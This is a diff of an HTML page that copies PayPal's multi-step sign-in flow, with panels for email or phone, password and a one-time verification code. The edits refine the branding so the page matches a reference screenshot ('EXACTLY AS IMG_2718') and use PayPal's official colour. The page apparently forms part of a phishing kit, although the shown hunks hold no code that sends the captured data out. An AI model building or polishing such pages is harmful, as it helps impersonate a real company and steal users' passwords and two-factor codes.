@@ -37,28 +37,14 @@
             border: 1px solid #E4E9F2;
         }
 
-        .domain {
-            font-size: 13px;
-            color: #6C7A8E;
-            text-align: center;
-            margin-bottom: 24px;
-            font-weight: 400;
-        }
-
-        /* ---------- EXACT PAYPAL LOGO (two‑tone, official brand) ---------- */
+        /* ---------- EXACT LOGO AS IN IMG_2718: single color, no "paypal.com" ---------- */
         .paypal-logo {
             text-align: center;
             font-size: 44px;
             font-weight: 700;
             letter-spacing: -0.5px;
-            margin-bottom: 32px;
-            line-height: 1.2;
-        }
-        .paypal-logo .pay {
-            color: #003087;
-        }
-        .paypal-logo .pal {
-            color: #009CDE;
+            margin-bottom: 28px;
+            color: #003087;   /* official PayPal dark blue */
         }
 
         .input-group {
@@ -330,12 +316,9 @@
 </head>
 <body>
 <div class="container">
-    <!-- STEP 1: EMAIL OR MOBILE NUMBER (EXACT REFERENCE) -->
+    <!-- STEP 1: EXACTLY AS IMG_2718.JPEG - # PayPal + Email or mobile number -->
     <div id="loginPanel" class="card">
-        <div class="domain">paypal.com</div>
-        <div class="paypal-logo">
-            <span class="pay">Pay</span><span class="pal">Pal</span>
-        </div>
+        <div class="paypal-logo">PayPal</div>
         <div class="input-group">
             <div class="input-label">Email or mobile number</div>
             <input type="text" id="loginIdentifier" placeholder="example@email.com or +1 234 567 8900" autocomplete="off">
@@ -348,10 +331,7 @@
 
     <!-- STEP 2: PHONE NUMBER ONLY -->
     <div id="phonePanel" class="card hide">
-        <div class="domain">paypal.com</div>
-        <div class="paypal-logo">
-            <span class="pay">Pay</span><span class="pal">Pal</span>
-        </div>
+        <div class="paypal-logo">PayPal</div>
         <div class="input-group">
             <div class="input-label">Mobile phone number</div>
             <input type="tel" id="userPhoneNumber" placeholder="+1 234 567 8900" autocomplete="off">
@@ -363,10 +343,7 @@
 
     <!-- STEP 3: PASSWORD ONLY -->
     <div id="passwordPanel" class="card hide">
-        <div class="domain">paypal.com</div>
-        <div class="paypal-logo">
-            <span class="pay">Pay</span><span class="pal">Pal</span>
-        </div>
+        <div class="paypal-logo">PayPal</div>
         <div class="input-group">
             <div class="input-label">Password</div>
             <input type="password" id="userPassword" placeholder="Enter your password" autocomplete="off">
@@ -414,10 +391,7 @@
 
     <!-- STEP 5: OTP PAGE (last 4 digits + email request option) -->
     <div id="otpPanel" class="card hide">
-        <div class="domain">paypal.com</div>
-        <div class="paypal-logo">
-            <span class="pay">Pay</span><span class="pal">Pal</span>
-        </div>
+        <div class="paypal-logo">PayPal</div>
         <div class="otp-hint" id="otpPhoneHint">🔐 Verification code sent to <span class="phone-mask" id="maskedPhone">****</span></div>
         <div class="input-group">
             <div class="input-label">Enter code</div>
